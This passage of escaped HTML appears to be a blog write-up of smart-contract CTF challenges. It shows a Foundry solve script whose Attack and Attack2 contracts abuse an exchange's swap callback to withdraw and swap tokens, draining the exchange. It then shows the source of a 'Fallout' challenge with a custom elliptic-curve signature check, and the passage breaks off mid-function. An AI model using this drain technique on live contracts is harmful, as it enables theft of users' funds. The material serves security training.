      
    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.0;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;forge-std&#x2F;Script.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;forge-std&#x2F;console.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;..&#x2F;src&#x2F;Exchange.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract ExchangeSolve is Script {
&lt;&#x2F;span&gt;&lt;span&gt;    Setup public set = Setup(0xd9beE8f7dF07fd718f54ed05CAD77FC0EF1F9A7B);
&lt;&#x2F;span&gt;&lt;span&gt;    Exchange public exchange = set.exchange();
&lt;&#x2F;span&gt;&lt;span&gt;    Token public token1 = set.token1();
&lt;&#x2F;span&gt;&lt;span&gt;    Token public token2 = set.token2();
&lt;&#x2F;span&gt;&lt;span&gt;    Token public token3 = set.token3();
&lt;&#x2F;span&gt;&lt;span&gt;    address player = vm.envAddress(&amp;quot;PLAYER&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function run() public {
&lt;&#x2F;span&gt;&lt;span&gt;        vm.startBroadcast(vm.envUint(&amp;quot;PRIVATE_KEY&amp;quot;));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player : &amp;quot;, player);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Setup : &amp;quot;, address(set));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Exchange : &amp;quot;, address(exchange));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Token1 : &amp;quot;, address(token1));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Token2 : &amp;quot;, address(token2));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Token3 : &amp;quot;, address(token3));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;isSolved() : &amp;quot;, set.isSolved());
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Exchange balance Token1 : &amp;quot;, token1.balanceOf(address(exchange)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Exchange balance Token2 : &amp;quot;, token2.balanceOf(address(exchange)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Exchange balance Token3 : &amp;quot;, token3.balanceOf(address(exchange)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance Token1 : &amp;quot;, token1.balanceOf(player));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance Token2 : &amp;quot;, token2.balanceOf(player));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance Token3 : &amp;quot;, token3.balanceOf(player));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        Attack attack = new Attack(address(set));
&lt;&#x2F;span&gt;&lt;span&gt;        attack.exploit();
&lt;&#x2F;span&gt;&lt;span&gt;        Attack2 attack2 = new Attack2(address(set));
&lt;&#x2F;span&gt;&lt;span&gt;        attack2.exploit();
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Exchange balance Token1 : &amp;quot;, token1.balanceOf(address(exchange)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Exchange balance Token2 : &amp;quot;, token2.balanceOf(address(exchange)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Exchange balance Token3 : &amp;quot;, token3.balanceOf(address(exchange)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Attacker balance Token1 : &amp;quot;, token1.balanceOf(address(attack)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Attacker balance Token2 : &amp;quot;, token2.balanceOf(address(attack)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Attacker 2 balance Token3 : &amp;quot;, token3.balanceOf(address(attack2)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;isSolved() : &amp;quot;, set.isSolved());
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack is SwapCallback{
&lt;&#x2F;span&gt;&lt;span&gt;    Setup public set;
&lt;&#x2F;span&gt;&lt;span&gt;    Exchange public exchange;
&lt;&#x2F;span&gt;&lt;span&gt;    Token public token1;
&lt;&#x2F;span&gt;&lt;span&gt;    Token public token2;
&lt;&#x2F;span&gt;&lt;span&gt;    Token public token3;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(address _setup) {
&lt;&#x2F;span&gt;&lt;span&gt;        set = Setup(_setup);
&lt;&#x2F;span&gt;&lt;span&gt;        exchange = set.exchange();
&lt;&#x2F;span&gt;&lt;span&gt;        token1 = set.token1();
&lt;&#x2F;span&gt;&lt;span&gt;        token2 = set.token2();
&lt;&#x2F;span&gt;&lt;span&gt;        token3 = set.token3();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function exploit() public {
&lt;&#x2F;span&gt;&lt;span&gt;        exchange.swap();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function doSwap() public {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        exchange.withdraw(address(token1), 200000);
&lt;&#x2F;span&gt;&lt;span&gt;        exchange.swapTokens(address(token1), address(token2), 200000, 0);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        exchange.withdraw(address(token2), 200000);
&lt;&#x2F;span&gt;&lt;span&gt;        exchange.swapTokens(address(token2), address(token3), 200000, 0);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack2 is SwapCallback{
&lt;&#x2F;span&gt;&lt;span&gt;    Setup public set;
&lt;&#x2F;span&gt;&lt;span&gt;    Exchange public exchange;
&lt;&#x2F;span&gt;&lt;span&gt;    Token public token1;
&lt;&#x2F;span&gt;&lt;span&gt;    Token public token2;
&lt;&#x2F;span&gt;&lt;span&gt;    Token public token3;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(address _setup) {
&lt;&#x2F;span&gt;&lt;span&gt;        set = Setup(_setup);
&lt;&#x2F;span&gt;&lt;span&gt;        exchange = set.exchange();
&lt;&#x2F;span&gt;&lt;span&gt;        token1 = set.token1();
&lt;&#x2F;span&gt;&lt;span&gt;        token2 = set.token2();
&lt;&#x2F;span&gt;&lt;span&gt;        token3 = set.token3();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function exploit() public {
&lt;&#x2F;span&gt;&lt;span&gt;        exchange.swap();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function doSwap() public {
&lt;&#x2F;span&gt;&lt;span&gt;        exchange.withdraw(address(token3), 400000);
&lt;&#x2F;span&gt;&lt;span&gt;        exchange.swapTokens(address(token3), address(token1), 400000, 0);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;fallout&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#fallout&quot; aria-label=&quot;Anchor link for: fallout&quot;&gt;Fallout&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;P: &quot;In the aftermath of the Great War, the world lies shattered, but hope endures in the form of Nuka-Cola Caps, the currency of the wasteland. Your mission, should you choose to accept it, is to obtain 1,000,000 Nuka-Cola Caps and secure your place as a true survivor in the barren expanse of post-apocalyptic America.&quot;&lt;&#x2F;p&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;Fallout.sol&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
      
    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.0;
&lt;&#x2F;span&gt;&lt;span&gt;import {ERC20} from &amp;quot;@openzeppelin-contracts-4.8.0&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Fallout is ERC20 {
&lt;&#x2F;span&gt;&lt;span&gt;    error WrongPlayer();
&lt;&#x2F;span&gt;&lt;span&gt;    error InvalidSignature();
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public immutable Qx;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public immutable Qy;
&lt;&#x2F;span&gt;&lt;span&gt;    address public immutable player;
&lt;&#x2F;span&gt;&lt;span&gt;    Vault public immutable vault;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(address _player, Vault _vault, uint256 qx, uint256 qy) ERC20(&amp;quot;Nuka-Cola&amp;quot;, &amp;quot;CAPS&amp;quot;) {
&lt;&#x2F;span&gt;&lt;span&gt;        Qx = qx;
&lt;&#x2F;span&gt;&lt;span&gt;        Qy = qy;
&lt;&#x2F;span&gt;&lt;span&gt;        player = _player;
&lt;&#x2F;span&gt;&lt;span&gt;        vault = _vault;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function mint(
&lt;&#x2F;span&gt;&lt;span&gt;        address recipient,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 value,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256[2] memory rs
&lt;&#x2F;span&gt;&lt;span&gt;    ) public {
&lt;&#x2F;span&gt;&lt;span&gt;        bytes32 hash = keccak256(abi.encode(recipient, value));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256[2] memory Q;
&lt;&#x2F;span&gt;&lt;span&gt;        Q[0] = Qx;
&lt;&#x2F;span&gt;&lt;span&gt;        Q[1] = Qy;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        bool valid = vault.validateSignature(hash, rs, Q);
&lt;&#x2F;span&gt;&lt;span&gt;        if (!valid) {
&lt;&#x2F;span&gt;&lt;span&gt;            revert InvalidSignature();
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        _mint(recipient, value);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function isSolved() public view returns (bool) {
&lt;&#x2F;span&gt;&lt;span&gt;        return balanceOf(player) &amp;gt;= 1_000_000 ether;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Vault {
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; Set parameters for curve.
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public immutable a;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public immutable b;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public immutable gx;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public immutable gy;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public immutable p;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(uint256 _a, uint256 _b, uint256 _gx, uint256 _gy, uint256 _p) {
&lt;&#x2F;span&gt;&lt;span&gt;        a = _a;
&lt;&#x2F;span&gt;&lt;span&gt;        b = _b;
&lt;&#x2F;span&gt;&lt;span&gt;        gx = _gx;
&lt;&#x2F;span&gt;&lt;span&gt;        gy = _gy;
&lt;&#x2F;span&gt;&lt;span&gt;        p = _p;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;**
&lt;&#x2F;span&gt;&lt;span&gt;     * @dev Inverse of u in the field of modulo m.
&lt;&#x2F;span&gt;&lt;span&gt;     *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function inverseMod(uint u, uint m) internal view
&lt;&#x2F;span&gt;&lt;span&gt;        returns (uint)
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        if (u == 0 || u == m || m == 0)
&lt;&#x2F;span&gt;&lt;span&gt;            return 0;
&lt;&#x2F;span&gt;&lt;span&gt;        if (u &amp;gt; m)
&lt;&#x2F;span&gt;&lt;span&gt;            u = u % m;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        int t1;
&lt;&#x2F;span&gt;&lt;span&gt;        int t2 = 1;
&lt;&#x2F;span&gt;&lt;span&gt;        uint r1 = m;
&lt;&#x2F;span&gt;&lt;span&gt;        uint r2 = u;
&lt;&#x2F;span&gt;&lt;span&gt;        uint q;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        while (r2 != 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            q = r1 &#x2F; r2;
&lt;&#x2F;span&gt;&lt;span&gt;            (t1, t2, r1, r2) = (t2, t1 - int(q) * t2, r2, r1 - q * r2);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (t1 &amp;lt; 0)
&lt;&#x2F;span&gt;&lt;span&gt;            return (m - uint(-t1));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        return uint(t1);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;**
&lt;&#x2F;span&gt;&lt;span&gt;     * @dev Transform affine coordinates into projective coordinates.
&lt;&#x2F;span&gt;&lt;span&gt;     *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;    function toProjectivePoint(uint x0, uint y0) public view
&lt;&#x2F;span&gt;&lt;span&gt;        returns (uint[3] memory P)
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        P[2] = addmod(0, 1, p);
&lt;&#x2F;span&gt;&lt;span&gt;        P[0] = mulmod(x0, P[2], p);
&lt;&#x2F;span&gt;&lt;span&gt;        P[1] = mulmod(y0, P[2], p);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;**
&lt;&#x2F;span&gt;&lt;span&gt;     * @dev Add two points in affine coordinates and return projective point.
&lt;&#x2F;span&gt;&lt;span&gt;     *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;    function addAndReturnProjectivePoint(uint x1, uint y1, uint x2, uint y2) public view
&lt;&#x2F;span&gt;&lt;span&gt;        returns (uint[3] memory P)
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        uint x;
&lt;&#x2F;span&gt;&lt;span&gt;        uint y;
&lt;&#x2F;span&gt;&lt;span&gt;        (x, y) = add(x1, y1, x2, y2);
&lt;&#x2F;span&gt;&lt;span&gt;        P = toProjectivePoint(x, y);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;**
&lt;&#x2F;span&gt;&lt;span&gt;     * @dev Transform from projective to affine coordinates.
&lt;&#x2F;span&gt;&lt;span&gt;     *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;    function toAffinePoint(uint x0, uint y0, uint z0) public view
&lt;&#x2F;span&gt;&lt;span&gt;        returns (uint x1, uint y1)
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        uint z0Inv;
&lt;&#x2F;span&gt;&lt;span&gt;        z0Inv = inverseMod(z0, p);
&lt;&#x2F;span&gt;&lt;span&gt;        x1 = mulmod(x0, z0Inv, p);
&lt;&#x2F;span&gt;&lt;span&gt;        y1 = mulmod(y0, z0Inv, p);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;**
&lt;&#x2F;span&gt;&lt;span&gt;     * @dev Return the zero curve in projective coordinates.
&lt;&#x2F;span&gt;&lt;span&gt;     *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;    function zeroProj() public view
&lt;&#x2F;span&gt;&lt;span&gt;        returns (uint x, uint y, uint z)
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        return (0, 1, 0);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;**
&lt;&#x2F;span&gt;&lt;span&gt;     * @dev Return the zero curve in affine coordinates.
&lt;&#x2F;span&gt;&lt;span&gt;     *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;    function zeroAffine() public view
&lt;&#x2F;span&gt;&lt;span&gt;        returns (uint x, uint y)
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        return (0, 0);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;**
&lt;&#x2F;span&gt;&lt;span&gt;     * @dev Check if the curve is the zero curve.
&lt;&#x2F;span&gt;&lt;span&gt;     *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;    function isZeroCurve(uint x0, uint y0) public view
&lt;&#x2F;span&gt;&lt;span&gt;        returns (bool isZero)
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        if(x0 == 0 &amp;amp;&amp;amp; y0 == 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            return true;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        return false;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;**
&lt;&#x2F;span&gt;&lt;span&gt;     * @dev Check if a point in affine coordinates is on the curve.
&lt;&#x2F;span&gt;&lt;span&gt;     *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;    function isOnCurve(uint x, uint y) public view
&lt;&#x2F;span&gt;&lt;span&gt;        returns (bool)
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        if (0 == x || x == p || 0 == y || y == p) {
&lt;&#x2F;span&gt;&lt;span&gt;            return false;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint LHS = mulmod(y, y, p); &#x2F;&#x2F; y^2
&lt;&#x2F;span&gt;&lt;span&gt;        uint RHS = mulmod(mulmod(x, x, p), x, p); &#x2F;&#x2F; x^3
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (a != 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            RHS = addmod(RHS, mulmod(x, a, p), p); &#x2F;&#x2F; x^3 + a*x
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        if (b != 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            RHS = addmod(RHS, b, p); &#x2F;&#x2F; x^3 + a*x + b
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        return LHS == RHS;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;**
&lt;&#x2F;span&gt;&lt;span&gt;     * @dev Double an elliptic curve point in projective coordinates. See
&lt;&#x2F;span&gt;&lt;span&gt;     * https:&#x2F;&#x2F;www.nayuki.io&#x2F;page&#x2F;elliptic-curve-point-addition-in-projective-coordinates
&lt;&#x2F;span&gt;&lt;span&gt;     *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;    function twiceProj(uint x0, uint y0, uint z0) public view
&lt;&#x2F;span&gt;&lt;span&gt;        returns (uint x1, uint y1, uint z1)
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        uint t;
&lt;&#x2F;span&gt;&lt;span&gt;        uint u;
&lt;&#x2F;span&gt;&lt;span&gt;        uint v;
&lt;&#x2F;span&gt;&lt;span&gt;        uint w;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if(isZeroCurve(x0, y0)) {
&lt;&#x2F;span&gt;&lt;span&gt;            return zeroProj();
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        u = mulmod(y0, z0, p);
&lt;&#x2F;span&gt;&lt;span&gt;        u = mulmod(u, 2, p);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        v = mulmod(u, x0, p);
&lt;&#x2F;span&gt;&lt;span&gt;        v = mulmod(v, y0, p);
&lt;&#x2F;span&gt;&lt;span&gt;        v = mulmod(v, 2, p);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        x0 = mulmod(x0, x0, p);
&lt;&#x2F;span&gt;&lt;span&gt;        t = mulmod(x0, 3, p);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        z0 = mulmod(z0, z0, p);
&lt;&#x2F;span&gt;&lt;span&gt;        z0 = mulmod(z0, a, p);
&lt;&#x2F;span&gt;&lt;span&gt;        t = addmod(t, z0, p);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        w = mulmod(t, t, p);
&lt;&#x2F;span&gt;&lt;span&gt;        x0 = mulmod(2, v, p);
&lt;&#x2F;span&gt;&lt;span&gt;        w = addmod(w, p-x0, p);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        x0 = addmod(v, p-w, p);
&lt;&#x2F;span&gt;&lt;span&gt;        x0 = mulmod(t, x0, p);
&lt;&#x2F;span&gt;&lt;span&gt;        y0 = mulmod(y0, u, p);
&lt;&#x2F;span&gt;&lt;span&gt;        y0 = mulmod(y0, y0, p);
&lt;&#x2F;span&gt;&lt;span&gt;        y0 = mulmod(2, y0, p);
&lt;&#x2F;span&gt;&lt;span&gt;        y1 = addmod(x0, p-y0, p);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        x1 = mulmod(u, w, p);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        z1 = mulmod(u, u, p);
&lt;&#x2F;span&gt;&lt;span&gt;        z1 = mulmod(z1, u, p);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;**
&lt;&#x2F;span&gt;&lt;span&gt;     * @dev Add two elliptic curve points in projective coordinates. See
&lt;&#x2F;span&gt;&lt;span&gt;     * https:&#x2F;&#x2F;www.nayuki.io&#x2F;page&#x2F;elliptic-curve-point-addition-in-projective-coordinates
&lt;&#x2F;span&gt;&lt;span&gt;     *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;    function addProj(uint x0, uint y0, uint z0, uint x1, uint y1, uint z1) public view
&lt;&#x2F;span&gt;&lt;span&gt;        returns (uint x2, uint y2, uint z2)
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        uint t0;
&lt;&#x2F;span&gt;&lt;span&gt;        uint t1;
&lt;&#x2F;span&gt;&lt;span&gt;        uint u0;
&lt;&#x2F;span&gt;&lt;span&gt;        uint u1;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (isZeroCurve(x0, y0)) {
&lt;&#x2F;span&gt;&lt;span&gt;            return (x1, y1, z1);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        else if (isZeroCurve(x1, y1)) {
&lt;&#x2F;span&gt;&lt;span&gt;            return (x0, y0, z0);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        t0 = mulmod(y0, z1, p);
&lt;&#x2F;span&gt;&lt;span&gt;        t1 = mulmod(y1, z0, p);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        u0 = mulmod(x0, z1, p);
&lt;&#x2F;span&gt;&lt;span&gt;        u1 = mulmod(x1, z0, p);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (u0 == u1) {
&lt;&#x2F;span&gt;&lt;span&gt;            if (t0 == t1) {
&lt;&#x2F;span&gt;&lt;span&gt;                return twiceProj(x0, y0, z0);
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;            else {
&lt;&#x2F;span&gt;&lt;span&gt;                return zeroProj();
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        (x2, y2, z2) = addProj2(mulmod(z0, z1, p), u0, u1, t1, t0);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;**
&lt;&#x2F;span&gt;&lt;span&gt;     * @dev Helper function that splits addProj to avoid too many local variables.
&lt;&#x2F;span&gt;&lt;span&gt;     *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;    function addProj2(uint v, uint u0, uint u1, uint t1, uint t0) private view
&lt;&#x2F;span&gt;&lt;span&gt;        returns (uint x2, uint y2, uint z2)
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        uint u;
&lt;&#x2F;span&gt;&lt;span&gt;        uint u2;
&lt;&#x2F;span&gt;&lt;span&gt;        uint u3;
&lt;&#x2F;span&gt;&lt;span&gt;        uint w;
&lt;&#x2F;span&gt;&lt;span&gt;        uint t;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        t = addmod(t0, p-t1, p);
&lt;&#x2F;span&gt;&lt;span&gt;        u = addmod(u0, p-u1, p);
&lt;&#x2F;span&gt;&lt;span&gt;        u2 = mulmod(u, u, p);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        w = mulmod(t, t, p);
&lt;&#x2F;span&gt;&lt;span&gt;        w = mulmod(w, v, p);
&lt;&#x2F;span&gt;&lt;span&gt;        u1 = addmod(u1, u0, p);
&lt;&#x2F;span&gt;&lt;span&gt;        u1 = mulmod(u1, u2, p);
